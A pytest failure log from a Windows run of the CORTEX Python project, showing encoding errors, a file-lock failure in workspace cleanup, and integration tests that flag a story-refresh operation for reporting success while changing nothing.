_____________ TestDryRunMixin.test_print_copyright_header_dry_run _____________
tests\operations\test_execution_mode.py:206: in test_print_copyright_header_dry_run
    mixin.print_copyright_header(
src\operations\dry_run_mixin.py:116: in print_copyright_header
    templates = self._load_templates()
                ^^^^^^^^^^^^^^^^^^^^^^
src\operations\dry_run_mixin.py:68: in _load_templates
    data = yaml.safe_load(f)
           ^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:124: in determine_encoding
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x81 in position 1223: character maps to <undefined>
_____ TestStoryRefreshIntegration.test_story_refresh_changes_output_file ______
tests\operations\test_story_refresh_integration.py:129: in test_story_refresh_changes_output_file
    assert hash_before != hash_after, (
E   AssertionError: SKULL-005 VIOLATION: Story refresh claims success but file unchanged!
E     Before: 9d2e3b70f321b5f49faa7dd8d52901a9
E     After:  9d2e3b70f321b5f49faa7dd8d52901a9
E     Operation: refresh_cortex_story
E     Status: True
E     This indicates a pass-through or no-op implementation.
E   assert '9d2e3b70f321b5f49faa7dd8d52901a9' != '9d2e3b70f321b5f49faa7dd8d52901a9'
------------------------------ Captured log call ------------------------------
INFO     src.operations:__init__.py:178 Resolved 'refresh story' \u2192 operation 'refresh_cortex_story'\nINFO     src.operations:__init__.py:127 Executing operation: refresh_cortex_story (profile: standard)\nINFO     src.operations.operation_factory:operation_factory.py:243 Created orchestrator for refresh_cortex_story with 5 modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:168 Starting operation: Refresh CORTEX Story (refresh_cortex_story) - LIVE mode\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:169 Modules to execute: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:182 Module execution order: ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index']\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: load_story_template (Load Story Template)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: preparation, Priority: 10\nINFO     src.operations.modules.load_story_template_module:load_story_template_module.py:107 Loading story template from: D:\\PROJECTS\\CORTEX\\prompts\\shared\\story.md\nINFO     src.operations.modules.load_story_template_module:load_story_template_module.py:135 Story loaded successfully: 456 lines, 19262 characters\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module load_story_template succeeded: Story template loaded (456 lines)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: apply_narrator_voice (Validate Story Structure)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: processing, Priority: 10\nWARNING  src.operations.modules.apply_narrator_voice_module:apply_narrator_voice_module.py:102 \u26a0\ufe0f  VALIDATION-ONLY: This module validates story structure but does NOT transform content. The story at prompts/shared/story.md is already in narrator voice. This operation validates it's ready for publication.\nINFO     src.operations.modules.apply_narrator_voice_module:apply_narrator_voice_module.py:140 \u2705 Story validation complete: 456 lines validated. No transformation applied (source already in narrator voice).\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module apply_narrator_voice succeeded: Story structure validated (456 lines, 2654 words, 13.3 min) - VALIDATION ONLY, no transformation\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: validate_story_structure (Validate Story Structure)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: validation, Priority: 10\nINFO     src.operations.modules.validate_story_structure_module:validate_story_structure_module.py:88 Validating story structure...\nINFO     src.operations.modules.validate_story_structure_module:validate_story_structure_module.py:164 Story structure validated: 19 headings, 0 warnings\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module validate_story_structure succeeded: Story structure valid (19 headings, 0 warnings)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: save_story_markdown (Save Story Markdown)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: finalization, Priority: 10\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:95 Saving story to: D:\\PROJECTS\\CORTEX\\docs\\awakening-of-cortex.md\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:106 Created backup: D:\\PROJECTS\\CORTEX\\docs\\awakening-of-cortex.backup.20251111_124225.md\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:140 Story saved successfully: 456 lines, 19899 bytes\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module save_story_markdown succeeded: Story saved to awakening-of-cortex.md (456 lines)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: update_mkdocs_index (Update MkDocs Index)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: finalization, Priority: 20\nINFO     src.operations.modules.update_mkdocs_index_module:update_mkdocs_index_module.py:98 Updating MkDocs navigation: D:\\PROJECTS\\CORTEX\\mkdocs.yml\nINFO     src.operations.modules.update_mkdocs_index_module:update_mkdocs_index_module.py:108 Story already found in MkDocs navigation (text search)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module update_mkdocs_index succeeded: Story already in MkDocs navigation\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:257 Operation Refresh CORTEX Story completed successfully\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:258   Modules executed: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:259   Modules succeeded: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:276 Operation Refresh CORTEX Story finished in 0.02s\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:284 Failed to capture learning: capture_operation_learning() missing 2 required positional arguments: 'result' and 'context'
______ TestStoryRefreshIntegration.test_story_refresh_produces_git_diff _______
tests\operations\test_story_refresh_integration.py:153: in test_story_refresh_produces_git_diff
    assert has_changes, (
E   AssertionError: SKULL-005 VIOLATION: Story refresh claims success but git diff empty!
E     Operation: refresh_cortex_story
E     Output file: D:\PROJECTS\CORTEX\docs\awakening-of-cortex.md
E     Status: True
E     Run 'git diff D:\PROJECTS\CORTEX\docs\awakening-of-cortex.md' to verify.
E     This indicates the operation did nothing despite claiming success.
E   assert False
------------------------------ Captured log call ------------------------------
INFO     src.operations:__init__.py:178 Resolved 'refresh story' \u2192 operation 'refresh_cortex_story'\nINFO     src.operations:__init__.py:127 Executing operation: refresh_cortex_story (profile: standard)\nINFO     src.operations.operation_factory:operation_factory.py:243 Created orchestrator for refresh_cortex_story with 5 modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:168 Starting operation: Refresh CORTEX Story (refresh_cortex_story) - LIVE mode\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:169 Modules to execute: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:182 Module execution order: ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index']\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: load_story_template (Load Story Template)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: preparation, Priority: 10\nINFO     src.operations.modules.load_story_template_module:load_story_template_module.py:107 Loading story template from: D:\\PROJECTS\\CORTEX\\prompts\\shared\\story.md\nINFO     src.operations.modules.load_story_template_module:load_story_template_module.py:135 Story loaded successfully: 456 lines, 19262 characters\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module load_story_template succeeded: Story template loaded (456 lines)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: apply_narrator_voice (Validate Story Structure)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: processing, Priority: 10\nWARNING  src.operations.modules.apply_narrator_voice_module:apply_narrator_voice_module.py:102 \u26a0\ufe0f  VALIDATION-ONLY: This module validates story structure but does NOT transform content. The story at prompts/shared/story.md is already in narrator voice. This operation validates it's ready for publication.\nINFO     src.operations.modules.apply_narrator_voice_module:apply_narrator_voice_module.py:140 \u2705 Story validation complete: 456 lines validated. No transformation applied (source already in narrator voice).\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module apply_narrator_voice succeeded: Story structure validated (456 lines, 2654 words, 13.3 min) - VALIDATION ONLY, no transformation\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: validate_story_structure (Validate Story Structure)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: validation, Priority: 10\nINFO     src.operations.modules.validate_story_structure_module:validate_story_structure_module.py:88 Validating story structure...\nINFO     src.operations.modules.validate_story_structure_module:validate_story_structure_module.py:164 Story structure validated: 19 headings, 0 warnings\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module validate_story_structure succeeded: Story structure valid (19 headings, 0 warnings)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: save_story_markdown (Save Story Markdown)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: finalization, Priority: 10\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:95 Saving story to: D:\\PROJECTS\\CORTEX\\docs\\awakening-of-cortex.md\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:106 Created backup: D:\\PROJECTS\\CORTEX\\docs\\awakening-of-cortex.backup.20251111_124225.md\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:140 Story saved successfully: 456 lines, 19899 bytes\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module save_story_markdown succeeded: Story saved to awakening-of-cortex.md (456 lines)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: update_mkdocs_index (Update MkDocs Index)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: finalization, Priority: 20\nINFO     src.operations.modules.update_mkdocs_index_module:update_mkdocs_index_module.py:98 Updating MkDocs navigation: D:\\PROJECTS\\CORTEX\\mkdocs.yml\nINFO     src.operations.modules.update_mkdocs_index_module:update_mkdocs_index_module.py:108 Story already found in MkDocs navigation (text search)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module update_mkdocs_index succeeded: Story already in MkDocs navigation\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:257 Operation Refresh CORTEX Story completed successfully\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:258   Modules executed: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:259   Modules succeeded: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:276 Operation Refresh CORTEX Story finished in 0.00s\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:284 Failed to capture learning: capture_operation_learning() missing 2 required positional arguments: 'result' and 'context'
____ TestStoryRefreshIntegration.test_apply_narrator_voice_not_passthrough ____
tests\operations\test_story_refresh_integration.py:172: in test_apply_narrator_voice_not_passthrough
    mock_patterns = self._check_for_mock_patterns(module_path)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
tests\operations\test_story_refresh_integration.py:67: in _check_for_mock_patterns
    content = module_path.read_text()
              ^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:546: in read_text
    return PathBase.read_text(self, encoding, errors, newline)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_abc.py:633: in read_text
    return f.read()
           ^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 3585: character maps to <undefined>
__ TestStoryRefreshIntegration.test_operation_success_matches_actual_changes __
tests\operations\test_story_refresh_integration.py:204: in test_operation_success_matches_actual_changes
    assert actual_changes, (
E   AssertionError: SKULL-005 VIOLATION: Operation reports success=True but no changes!
E     Operation: refresh_cortex_story
E     Modules executed: 5
E     Modules succeeded: 5
E     File hash unchanged: 9d2e3b70f321b5f49faa7dd8d52901a9
E     
E     This is a FALSE SUCCESS - operation did nothing.
E     Fix by implementing real transformation or returning success=False.
E   assert False
------------------------------ Captured log call ------------------------------
INFO     src.operations:__init__.py:178 Resolved 'refresh story' \u2192 operation 'refresh_cortex_story'\nINFO     src.operations:__init__.py:127 Executing operation: refresh_cortex_story (profile: standard)\nINFO     src.operations.operation_factory:operation_factory.py:243 Created orchestrator for refresh_cortex_story with 5 modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:168 Starting operation: Refresh CORTEX Story (refresh_cortex_story) - LIVE mode\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:169 Modules to execute: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:182 Module execution order: ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index']\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: load_story_template (Load Story Template)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: preparation, Priority: 10\nINFO     src.operations.modules.load_story_template_module:load_story_template_module.py:107 Loading story template from: D:\\PROJECTS\\CORTEX\\prompts\\shared\\story.md\nINFO     src.operations.modules.load_story_template_module:load_story_template_module.py:135 Story loaded successfully: 456 lines, 19262 characters\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module load_story_template succeeded: Story template loaded (456 lines)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: apply_narrator_voice (Validate Story Structure)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: processing, Priority: 10\nWARNING  src.operations.modules.apply_narrator_voice_module:apply_narrator_voice_module.py:102 \u26a0\ufe0f  VALIDATION-ONLY: This module validates story structure but does NOT transform content. The story at prompts/shared/story.md is already in narrator voice. This operation validates it's ready for publication.\nINFO     src.operations.modules.apply_narrator_voice_module:apply_narrator_voice_module.py:140 \u2705 Story validation complete: 456 lines validated. No transformation applied (source already in narrator voice).\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module apply_narrator_voice succeeded: Story structure validated (456 lines, 2654 words, 13.3 min) - VALIDATION ONLY, no transformation\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: validate_story_structure (Validate Story Structure)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: validation, Priority: 10\nINFO     src.operations.modules.validate_story_structure_module:validate_story_structure_module.py:88 Validating story structure...\nINFO     src.operations.modules.validate_story_structure_module:validate_story_structure_module.py:164 Story structure validated: 19 headings, 0 warnings\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module validate_story_structure succeeded: Story structure valid (19 headings, 0 warnings)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: save_story_markdown (Save Story Markdown)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: finalization, Priority: 10\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:95 Saving story to: D:\\PROJECTS\\CORTEX\\docs\\awakening-of-cortex.md\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:106 Created backup: D:\\PROJECTS\\CORTEX\\docs\\awakening-of-cortex.backup.20251111_124225.md\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:140 Story saved successfully: 456 lines, 19899 bytes\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module save_story_markdown succeeded: Story saved to awakening-of-cortex.md (456 lines)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: update_mkdocs_index (Update MkDocs Index)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: finalization, Priority: 20\nINFO     src.operations.modules.update_mkdocs_index_module:update_mkdocs_index_module.py:98 Updating MkDocs navigation: D:\\PROJECTS\\CORTEX\\mkdocs.yml\nINFO     src.operations.modules.update_mkdocs_index_module:update_mkdocs_index_module.py:108 Story already found in MkDocs navigation (text search)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module update_mkdocs_index succeeded: Story already in MkDocs navigation\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:257 Operation Refresh CORTEX Story completed successfully\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:258   Modules executed: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:259   Modules succeeded: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:276 Operation Refresh CORTEX Story finished in 0.01s\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:284 Failed to capture learning: capture_operation_learning() missing 2 required positional arguments: 'result' and 'context'
_____ TestStoryRefreshIntegration.test_story_output_has_expected_sections _____
tests\operations\test_story_refresh_integration.py:229: in test_story_output_has_expected_sections
    content = self.story_output.read_text()
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:546: in read_text
    return PathBase.read_text(self, encoding, errors, newline)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_abc.py:633: in read_text
    return f.read()
           ^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 1856: character maps to <undefined>
------------------------------ Captured log call ------------------------------
INFO     src.operations:__init__.py:178 Resolved 'refresh story' \u2192 operation 'refresh_cortex_story'\nINFO     src.operations:__init__.py:127 Executing operation: refresh_cortex_story (profile: standard)\nINFO     src.operations.operation_factory:operation_factory.py:243 Created orchestrator for refresh_cortex_story with 5 modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:168 Starting operation: Refresh CORTEX Story (refresh_cortex_story) - LIVE mode\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:169 Modules to execute: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:182 Module execution order: ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index']\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: load_story_template (Load Story Template)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: preparation, Priority: 10\nINFO     src.operations.modules.load_story_template_module:load_story_template_module.py:107 Loading story template from: D:\\PROJECTS\\CORTEX\\prompts\\shared\\story.md\nINFO     src.operations.modules.load_story_template_module:load_story_template_module.py:135 Story loaded successfully: 456 lines, 19262 characters\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module load_story_template succeeded: Story template loaded (456 lines)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: apply_narrator_voice (Validate Story Structure)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: processing, Priority: 10\nWARNING  src.operations.modules.apply_narrator_voice_module:apply_narrator_voice_module.py:102 \u26a0\ufe0f  VALIDATION-ONLY: This module validates story structure but does NOT transform content. The story at prompts/shared/story.md is already in narrator voice. This operation validates it's ready for publication.\nINFO     src.operations.modules.apply_narrator_voice_module:apply_narrator_voice_module.py:140 \u2705 Story validation complete: 456 lines validated. No transformation applied (source already in narrator voice).\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module apply_narrator_voice succeeded: Story structure validated (456 lines, 2654 words, 13.3 min) - VALIDATION ONLY, no transformation\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: validate_story_structure (Validate Story Structure)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: validation, Priority: 10\nINFO     src.operations.modules.validate_story_structure_module:validate_story_structure_module.py:88 Validating story structure...\nINFO     src.operations.modules.validate_story_structure_module:validate_story_structure_module.py:164 Story structure validated: 19 headings, 0 warnings\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module validate_story_structure succeeded: Story structure valid (19 headings, 0 warnings)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: save_story_markdown (Save Story Markdown)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: finalization, Priority: 10\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:95 Saving story to: D:\\PROJECTS\\CORTEX\\docs\\awakening-of-cortex.md\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:106 Created backup: D:\\PROJECTS\\CORTEX\\docs\\awakening-of-cortex.backup.20251111_124225.md\nINFO     src.operations.modules.save_story_markdown_module:save_story_markdown_module.py:140 Story saved successfully: 456 lines, 19899 bytes\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module save_story_markdown succeeded: Story saved to awakening-of-cortex.md (456 lines)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: update_mkdocs_index (Update MkDocs Index)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: finalization, Priority: 20\nINFO     src.operations.modules.update_mkdocs_index_module:update_mkdocs_index_module.py:98 Updating MkDocs navigation: D:\\PROJECTS\\CORTEX\\mkdocs.yml\nINFO     src.operations.modules.update_mkdocs_index_module:update_mkdocs_index_module.py:108 Story already found in MkDocs navigation (text search)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:222 Module update_mkdocs_index succeeded: Story already in MkDocs navigation\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:257 Operation Refresh CORTEX Story completed successfully\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:258   Modules executed: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:259   Modules succeeded: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:276 Operation Refresh CORTEX Story finished in 0.01s\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:284 Failed to capture learning: capture_operation_learning() missing 2 required positional arguments: 'result' and 'context'
______ TestStoryRefreshIntegration.test_operation_handles_missing_source ______
tests\operations\test_story_refresh_integration.py:297: in test_operation_handles_missing_source
    with pytest.raises(Exception) as exc_info:
         ^^^^^^^^^^^^^^^^^^^^^^^^
E   Failed: DID NOT RAISE <class 'Exception'>
------------------------------ Captured log call ------------------------------
INFO     src.operations:__init__.py:178 Resolved 'refresh story' \u2192 operation 'refresh_cortex_story'\nINFO     src.operations:__init__.py:127 Executing operation: refresh_cortex_story (profile: standard)\nINFO     src.operations.operation_factory:operation_factory.py:243 Created orchestrator for refresh_cortex_story with 5 modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:168 Starting operation: Refresh CORTEX Story (refresh_cortex_story) - LIVE mode\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:169 Modules to execute: 5\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:182 Module execution order: ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index']\nERROR    src.operations.operations_orchestrator:operations_orchestrator.py:198 Prerequisites not met for load_story_template: ['Story file not found: C:\\\\Windows\\\\Temp\\\\pytest-of-asifh\\\\pytest-104\\\\test_operation_handles_missing0\\\\prompts\\\\shared\\\\story.md']\nERROR    src.operations.operations_orchestrator:operations_orchestrator.py:203 Required module load_story_template failed prerequisite check\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:367 Rolling back executed modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:276 Operation Refresh CORTEX Story finished in 0.00s\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:284 Failed to capture learning: capture_operation_learning() missing 2 required positional arguments: 'result' and 'context'
_______ TestMockDetectionForAllOperations.test_no_mocks_in_demo_modules _______
tests\operations\test_story_refresh_integration.py:366: in test_no_mocks_in_demo_modules
    content = module_path.read_text()
              ^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:546: in read_text
    return PathBase.read_text(self, encoding, errors, newline)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_abc.py:633: in read_text
    return f.read()
           ^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5325: character maps to <undefined>
_________________ test_cleanup_safe_profile_scans_and_reports _________________
tests\operations\test_workspace_cleanup.py:63: in test_cleanup_safe_profile_scans_and_reports
    assert report.success is True
E   assert False is True
E    +  where False = OperationExecutionReport(operation_id='workspace_cleanup', operation_name='Workspace Cleanup', success=False, modules_executed=['cleanup_orchestrator'], modules_succeeded=[], modules_failed=['cleanup_orchestrator'], modules_skipped=[], module_results={'cleanup_orchestrator': OperationResult(success=False, status=<OperationStatus.FAILED: 'failed'>, message="Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'", data={'error': "[WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'"}, errors=[], warnings=[], duration_seconds=0.0, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 25, 654346), execution_mode=<ExecutionMode.LIVE: 'live'>, formatted_header=None, formatted_footer=None)}, total_duration_seconds=0.012135, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 25, 654551), context={'project_root': WindowsPath('C:/Windows/Temp/pytest-of-asifh/pytest-104/test_cleanup_safe_profile_scan0/cortex_sandbox'), 'profile': 'safe', 'execution_mode': <ExecutionMode.LIVE: 'live'>}, errors=[]).success
---------------------------- Captured stdout call -----------------------------
\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX Cleanup Orchestrator v1.0.0\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nProfile: safe  \u2502  Mode: LIVE EXECUTION  \u2502  Started: 2025-11-11 12:42:25\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n
------------------------------ Captured log call ------------------------------
